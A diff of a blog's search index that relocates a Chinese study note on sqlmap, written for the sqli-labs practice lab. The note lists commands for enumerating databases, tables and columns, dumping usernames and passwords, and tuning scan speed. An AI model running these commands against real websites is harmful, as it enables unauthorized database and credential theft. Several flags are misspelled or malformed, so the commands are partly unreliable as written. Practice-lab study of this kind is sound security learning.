         <tag>SQL注入</tag>
@@ -2434,6 +2434,40 @@ Referer:发出请求的页面的URI。
       </tags>
   </entry>
   <entry>
+    <title>sqlmap</title>
+    <url>/2020/11/24/sqli-labs/sqlmap/</url>
+    <content><![CDATA[<p>   sqlmap的简单利用</p>
+<span id="more"></span>
+
+<h4 id="1、爆全部库名"><a href="#1、爆全部库名" class="headerlink" title="1、爆全部库名"></a>1、爆全部库名</h4><pre><code>`sqlmap.py -u 地址 ?id=1 --dbs`  ***?id=1 不能漏，不然找不到，这里的--也可以是-，还有大小写也要注意一下。    
+</code></pre>
+<h4 id="2、爆指定库全部表名"><a href="#2、爆指定库全部表名" class="headerlink" title="2、爆指定库全部表名"></a>2、爆指定库全部表名</h4><pre><code>`sqlmap.py -u 地址 ?id=1 -D securtiy -tables`
+</code></pre>
+<h4 id="3、爆指定表中的字段"><a href="#3、爆指定表中的字段" class="headerlink" title="3、爆指定表中的字段"></a>3、爆指定表中的字段</h4><pre><code>`sqlmap.py -u 地址 ?id=1 -D security -T users -columns `
+</code></pre>
+<h4 id="4、-爆字段里面的内容"><a href="#4、-爆字段里面的内容" class="headerlink" title="4、 爆字段里面的内容"></a>4、 爆字段里面的内容</h4><pre><code>`sqlmap.py -u 地址 ?id=1 -D security -T users -C id,password,username -dump`
+</code></pre>
+<h4 id="5、-爆数据库的所有用户"><a href="#5、-爆数据库的所有用户" class="headerlink" title="5、 爆数据库的所有用户"></a>5、 爆数据库的所有用户</h4><pre><code>`sqlmap.py -u 地址 ?id=1 -users`
+</code></pre>
+<h4 id="6、-爆数据库用户的密码"><a href="#6、-爆数据库用户的密码" class="headerlink" title="6、 爆数据库用户的密码"></a>6、 爆数据库用户的密码</h4><pre><code>`sqlmap.py -u 地址 ?id=1 -passwords`
+</code></pre>
+<h4 id="7、-获得当前网站数据库名称"><a href="#7、-获得当前网站数据库名称" class="headerlink" title="7、 获得当前网站数据库名称"></a>7、 获得当前网站数据库名称</h4><pre><code>`sqlmap.py -u 地址 ?id=1 -current-db` 这里的-不能空格
+当前用户名同样。
+</code></pre>
+<h3 id="优化sqlmap"><a href="#优化sqlmap" class="headerlink" title="优化sqlmap"></a>优化sqlmap</h3><h4 id="设置持久连接"><a href="#设置持久连接" class="headerlink" title="设置持久连接"></a>设置持久连接</h4><pre><code>`sqlmap.py -u 地址 ?id=1 -keep-alive --banner -v 5 `
+</code></pre>
+<h4 id="设置不接受http-body"><a href="#设置不接受http-body" class="headerlink" title="设置不接受http body"></a>设置不接受http body</h4><pre><code>`sqlmap.py -u 地址 ?id=1 --null connection`
+</code></pre>
+<h4 id="运行速度"><a href="#运行速度" class="headerlink" title="运行速度"></a>运行速度</h4><pre><code>`sqlmap.py -u 地址 ?id=1 --threads=3`
+</code></pre>
+<h4 id="一键优化"><a href="#一键优化" class="headerlink" title="一键优化"></a>一键优化</h4><pre><code>`sqlmap.py -u 地址 ?id=1 -o --banner -v 5`
+</code></pre>
+]]></content>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>mysql3</title>
     <url>/2020/11/11/sqli-labs/mysql3/</url>
     <content><![CDATA[<h2 id="mysql插入数据"><a href="#mysql插入数据" class="headerlink" title="mysql插入数据"></a>mysql插入数据</h2><p><code>insert into 表名(名称1，-，-)</code><br><code>values</code><br><code>(插入的数据);</code></p>
@@ -2483,40 +2517,6 @@ null记录总数，可用`select coalesce (表中字段名，&#39;任意你想�
 <p><strong>识别waf</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u xxxxx --identify-waf --batch</span><br></pre></td></tr></table></figure>
 
-]]></content>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqlmap</title>
-    <url>/2020/11/24/sqli-labs/sqlmap/</url>
-    <content><![CDATA[<p>   sqlmap的简单利用</p>
-<span id="more"></span>
-
-<h4 id="1、爆全部库名"><a href="#1、爆全部库名" class="headerlink" title="1、爆全部库名"></a>1、爆全部库名</h4><pre><code>`sqlmap.py -u 地址 ?id=1 --dbs`  ***?id=1 不能漏，不然找不到，这里的--也可以是-，还有大小写也要注意一下。    
-</code></pre>
-<h4 id="2、爆指定库全部表名"><a href="#2、爆指定库全部表名" class="headerlink" title="2、爆指定库全部表名"></a>2、爆指定库全部表名</h4><pre><code>`sqlmap.py -u 地址 ?id=1 -D securtiy -tables`
-</code></pre>
-<h4 id="3、爆指定表中的字段"><a href="#3、爆指定表中的字段" class="headerlink" title="3、爆指定表中的字段"></a>3、爆指定表中的字段</h4><pre><code>`sqlmap.py -u 地址 ?id=1 -D security -T users -columns `
-</code></pre>
-<h4 id="4、-爆字段里面的内容"><a href="#4、-爆字段里面的内容" class="headerlink" title="4、 爆字段里面的内容"></a>4、 爆字段里面的内容</h4><pre><code>`sqlmap.py -u 地址 ?id=1 -D security -T users -C id,password,username -dump`
-</code></pre>
-<h4 id="5、-爆数据库的所有用户"><a href="#5、-爆数据库的所有用户" class="headerlink" title="5、 爆数据库的所有用户"></a>5、 爆数据库的所有用户</h4><pre><code>`sqlmap.py -u 地址 ?id=1 -users`
-</code></pre>
-<h4 id="6、-爆数据库用户的密码"><a href="#6、-爆数据库用户的密码" class="headerlink" title="6、 爆数据库用户的密码"></a>6、 爆数据库用户的密码</h4><pre><code>`sqlmap.py -u 地址 ?id=1 -passwords`
-</code></pre>
-<h4 id="7、-获得当前网站数据库名称"><a href="#7、-获得当前网站数据库名称" class="headerlink" title="7、 获得当前网站数据库名称"></a>7、 获得当前网站数据库名称</h4><pre><code>`sqlmap.py -u 地址 ?id=1 -current-db` 这里的-不能空格
-当前用户名同样。
-</code></pre>
-<h3 id="优化sqlmap"><a href="#优化sqlmap" class="headerlink" title="优化sqlmap"></a>优化sqlmap</h3><h4 id="设置持久连接"><a href="#设置持久连接" class="headerlink" title="设置持久连接"></a>设置持久连接</h4><pre><code>`sqlmap.py -u 地址 ?id=1 -keep-alive --banner -v 5 `
-</code></pre>
-<h4 id="设置不接受http-body"><a href="#设置不接受http-body" class="headerlink" title="设置不接受http body"></a>设置不接受http body</h4><pre><code>`sqlmap.py -u 地址 ?id=1 --null connection`
-</code></pre>
-<h4 id="运行速度"><a href="#运行速度" class="headerlink" title="运行速度"></a>运行速度</h4><pre><code>`sqlmap.py -u 地址 ?id=1 --threads=3`
-</code></pre>
-<h4 id="一键优化"><a href="#一键优化" class="headerlink" title="一键优化"></a>一键优化</h4><pre><code>`sqlmap.py -u 地址 ?id=1 -o --banner -v 5`
-</code></pre>
 ]]></content>
       <tags>
         <tag>SQL注入</tag>
